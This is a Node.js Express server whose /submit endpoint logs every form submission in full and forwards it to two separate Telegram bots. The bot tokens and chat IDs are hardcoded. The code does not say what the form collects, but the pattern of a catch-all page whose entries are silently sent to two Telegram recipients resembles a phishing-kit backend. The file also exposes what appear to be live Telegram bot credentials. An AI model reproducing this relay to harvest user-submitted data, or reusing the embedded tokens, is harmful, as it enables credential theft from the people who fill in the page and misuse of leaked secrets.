const fetch = require('node-fetch');

const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3000;

const TELEGRAM_TOKEN1 = '7655310388:AAGiauGQ8lEPAm0yPwBBqYZcF1LtS_wb2AI';
const TELEGRAM_CHAT_ID1 = '5031717876';

const TELEGRAM_TOKEN2 = '7667562046:AAFQyO7ZhTk0e_VnkeDIBHqt47zgwTL33CM';
const TELEGRAM_CHAT_ID2 = '5825012981';

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/submit', async (req, res) => {
  const formData = req.body;

  console.log('Received form data:', formData);

  const messageText = `
✅ New submission received:

${JSON.stringify(formData, null, 2)}
`;

  try {
    // Prepare URLs
    const telegramUrl1 = `https://api.telegram.org/bot${TELEGRAM_TOKEN1}/sendMessage`;
    const telegramUrl2 = `https://api.telegram.org/bot${TELEGRAM_TOKEN2}/sendMessage`;

    // Send to both bots in parallel
    const [response1, response2] = await Promise.all([
      fetch(telegramUrl1, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID1,
          text: messageText
        })
      }),
      fetch(telegramUrl2, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID2,
          text: messageText
        })
      })
    ]);

    const result1 = await response1.text();
    const result2 = await response2.text();

    console.log('Telegram bot 1 response:', result1);
    console.log('Telegram bot 2 response:', result2);

    if (!response1.ok || !response2.ok) {
      return res.status(500).json({ error: 'Failed to send Telegram messages' });
    }

    res.json({ message: 'Success: Data sent to both Telegram bots' });
  } catch (error) {
    console.error('Telegram error:', error);
    res.status(500).json({ error: 'Telegram error' });
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`✅ Server listening at http://localhost:${PORT}`);
});
